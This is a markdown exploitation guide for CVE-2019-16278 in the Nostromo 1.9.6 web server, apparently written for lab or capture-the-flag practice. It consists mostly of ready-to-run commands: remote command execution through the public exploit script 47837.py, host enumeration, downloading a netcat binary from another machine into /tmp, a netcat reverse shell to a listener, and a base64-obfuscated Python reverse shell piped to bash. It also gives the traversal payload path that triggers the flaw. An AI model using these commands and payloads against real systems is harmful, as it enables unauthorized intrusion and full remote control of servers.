# Nostromo-1.9.6 Exploit Guide

üîß [Nostromo 1.9.6 Exploit (CVE-2019-16278)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16278)

## üìÇ Description
A critical vulnerability exists in Nostromo HTTP Server version 1.9.6, identified as **CVE-2019-16278**. This flaw allows unauthenticated remote attackers to perform directory traversal and execute arbitrary system commands, leading to full system compromise.

---

## üß© 1. CVE Information and Useful Resources

- üìÑ [CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16278)  
- üìù [Nostromo Exploit Writeup - Hacking Articles](https://www.hackingarticles.in/nostromo-1-9-6-directory-traversal-remote-code-execution/)  
- üí£ [Exploit-DB Entry](https://www.exploit-db.com/exploits/47837)  
- üßë‚Äçüíª [GitHub - Exploit Code](https://github.com/0x00-0x00/CVE-2019-16278)

---

## üîß 2. Preparing and Editing the Exploit

Open the exploit script using `vim` for inspection or modifications:
```bash
vim 47837.py
```
Make changes if required‚Äîlike updating IP addresses, ports, or payloads.

---

## üöÄ 3. Executing the Exploit

Basic syntax for using the exploit script:
```bash
python 47837.py <target_ip> <target_port> <command>
```

### Common Enumeration Commands:

Execute `id` command:
```bash
python 47837.py 192.168.1.211 2222 id
```

Check system version:
```bash
python 47837.py 192.168.1.211 2222 "uname -a"
```

Locate Netcat:
```bash
python 47837.py 192.168.1.211 2222 "which nc"
```

Find PHP version:
```bash
python 47837.py 192.168.1.211 2222 "php -v"
```

Check for Python installation:
```bash
python 47837.py 192.168.1.211 2222 "which python"
```

---

## üêç 4. Compatibility with Python 2.7

Some systems may require Python 2.7 due to compatibility issues.

Test Netcat:
```bash
python2.7 47837.py 192.168.1.208 2222 "nc"
```

Find Netcat location:
```bash
python2.7 47837.py 192.168.1.208 2222 'which nc'
```

Use `whereis` for detailed search:
```bash
python2.7 47837.py 192.168.1.208 2222 'whereis nc'
```

Search for writable directories:
```bash
python2.7 47837.py 192.168.1.208 2222 'find / -writable'
```

### Common Writable Locations:
```
/dev/shm
/tmp
/var/tmp
```

Create a test file in `/tmp`:
```bash
python2.7 47837.py 192.168.1.208 2222 'touch /tmp/1.txt'
```

Create a test file in `/dev/shm`:
```bash
python2.7 47837.py 192.168.1.208 2222 'touch /dev/shm/1.txt'
```

---

## üîÅ 5. Reverse Shell Techniques

Download Netcat binary:
```bash
python2.7 47837.py 192.168.31.127 2222  'wget http://192.168.31.57/nc64 -O /tmp/nc64'
```

Launch reverse shell:
```bash
python2.7 47837.py 192.168.1.208 2222 '/tmp/nc64 -e /bin/bash 192.168.1.7 22'
```

Start listener on attacker's machine:
```bash
nc -nlvp 22
```

### Using Base64-Encoded Python Shell:
````bash
python2.7 exploit.py 192.168.1.233 2222 'echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTkyLjE2OC4xLjgiLDQ0MykpO3MuZHVwMihzLmZpbGVubygpLDApO3MuZHVwMihzLmZpbGVubygpLDEpO3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7cHR5LnNwYXduKCJzaCIpJw==' | base64 -d | bash
````

---

## üåê 6. Hosting a Simple HTTP Server

Python 2.x:
```bash
python2.7 -m SimpleHTTPServer 80
```

Python 3.x:
```bash
python3 -m http.server 80
```

---

## üîç How the Exploit Works

1. **Takes input parameters**: IP, port, command.
2. **Crafts a malicious HTTP POST** request:
   - The path `/.%0d./.%0d./.%0d./.%0d./bin/sh` exploits the path traversal bug.
   - `%0d` (carriage return) bypasses server restrictions.
   - The shell command is embedded in the HTTP body.
3. **Sends the payload** to the vulnerable server.
4. **Displays the command output** returned by the server.

---

## ‚úÖ Quick Reference: Commands and Usage

| Command                  | Purpose                                                   |
|--------------------------|-----------------------------------------------------------|
| `python2.7`              | Runs the exploit using Python 2.7                        |
| `nc`                     | Netcat ‚Äì used for reverse shells or raw socket access     |
| `touch`                  | Creates an empty file                                    |
| `find / -writable`       | Lists all writable directories                          |
| `base64 -d`              | Decodes a Base64 string                                  |
| `bash`                   | Executes a command shell                                 |
| `SimpleHTTPServer`       | Hosts files via HTTP (Python 2)                         |
| `http.server`            | Hosts files via HTTP (Python 3)                         |

---

